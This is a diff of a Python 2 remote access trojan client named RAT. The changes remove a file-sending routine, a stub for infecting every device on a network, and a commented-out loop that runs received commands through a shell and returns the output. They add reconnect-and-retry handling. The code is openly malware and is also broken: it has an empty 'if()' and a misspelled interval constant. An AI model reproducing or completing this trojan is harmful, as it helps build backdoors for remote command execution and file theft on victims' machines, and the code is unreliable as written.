@@ -118,10 +118,15 @@ class RAT:
 	_sock = None
 	_port = None
 	_loop = None
+
 	BUFFER = 1024
-	SIG = "ACTIVE\r\n\n"
-	PASS = "DONE\r\n\n"
-	FAIL = "FILE_NONE\r\n\n"
+	SHORT_INTERVAL = 0.1
+	MID_INTERVAL = 0.8
+	LONG_INTERAL = 10
+
+	SIG = "ACTIVE"
+	PASS = "DONE"
+	FAIL = "FILE_NONE"
 	FLAG = False
 
 
@@ -172,27 +177,8 @@ class RAT:
 		sys.exit()
 
 
-	# send file to socket
-	def sftp(cls, path):
-		if(os.path.exists(path)):
-			f = open(path, 'rb')
-			pkt = f.read(cls.BUFFER)
-			while pkt != '':
-				cls.send(pkt)
-				pkt = f.read(cls.BUFFER)
-			cls.send(cls.PASS)
-			f.close()
-		else:
-			cls.send(cls.FAIL)
 
-
-	# infest all devices in the net
-	def infestation(cls):
-		# TODO --
-		"""
-			Try to fine a way to infest all devices in the network
-		"""
-		cls.send("NOT READY YET!")
+	
 
 
 	# start the service
@@ -203,16 +189,41 @@ class RAT:
 				cls.connect(cls._loop, cls._port)
 			
 				data = cls.receive()
-				if(data == "Activate"):
+				if(data == cls.SIG):
 					cls.FLAG = True
 					cls.send("\n" + os.getcwd() + "> ")
+
+				if()
 
 			except socket.error as e:
 				# Connection refused
 				if(e[0] is 61):
 					cls.stop()
-					time.sleep(10)
+					time.sleep(cls.LONG_INTERVAL)
 					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
+					continue
+				# Socket is not connected
+				if(e[0] is 57):
+					cls.stop()
+					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
+					time.sleep(cls.LONG_INTERVAL)		
+					continue
+				# Bad file descriptor
+				elif(e[0] is 9):
+					cls.stop()
+					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
+					time.sleep(cls.LONG_INTERVAL)
+					continue
+				# Broken Pipe
+				elif(e[0] is 32):
+					cls.stop()
+					print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
+					time.sleep(cls.LONG_INTERVAL)
+					continue
+				else:
+					cls.stop()
+					print "CODE: {}\nMSG: {}".format(str(e[0]), str(e[1]))
+					time.sleep(cls.LONG_INTERVAL)
 					continue
 
 
@@ -224,61 +235,4 @@ def main():
 if __name__ == '__main__':
 	main()
 
-
-
-
-
-	# # connect to socket and look of commands
-	# def start(cls):
-	# 	while True:
-	# 		try:
-	# 			cls.init()
-	# 			cls.send(cls.SIG)
-	# 			cls.receive(cls.)
-
-	# 			cmd = cls.receive(cls.BUFFER)
-	# 			if('kill' in cmd):
-	# 				cls.stop()
-	# 				break
-	# 			elif('get' in cmd):
-	# 				g,p = cmd.split(' ')
-	# 				try:
-	# 					cls.sftp(cls._sock, p)	
-	# 				except Exception as e:
-	# 					cls.send(str(e))
-	# 					pass
-	# 			elif('brodcast' in cmd):
-	# 				try:
-	# 					cls.infestation()
-	# 				except Exception as e:
-	# 					cls.send(str(e))
-	# 			else:
-	# 				CMD = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-	# 				cls.send(CMD.stdout.read())
-	# 				cls.send(CMD.stderr.read())
-	# 		except socket.error as e:
-	# 			print "-------"
-	# 			# Socket is not connected
-	# 			if(e[0] is 57):
-	# 				cls.stop()
-	# 				print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
-	# 				time.sleep(10)		
-	# 				continue
-	# 			# Bad file descriptor
-	# 			elif(e[0] is 9):
-	# 				cls.stop()
-	# 				print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
-	# 				time.sleep(10)
-	# 				continue
-	# 			# Broken Pipe
-	# 			elif(e[0] is 32):
-	# 				cls.stop()
-	# 				print "CODE: {}\nMSG: {}\n-------".format(str(e[0]), str(e[1]))
-	# 				time.sleep(10)
-	# 				continue
-	# 			else:
-	# 				cls.stop()
-	# 				print "CODE: {}\nMSG: {}".format(str(e[0]), str(e[1]))
-	# 				time.sleep(10)
-	# 				continue
 
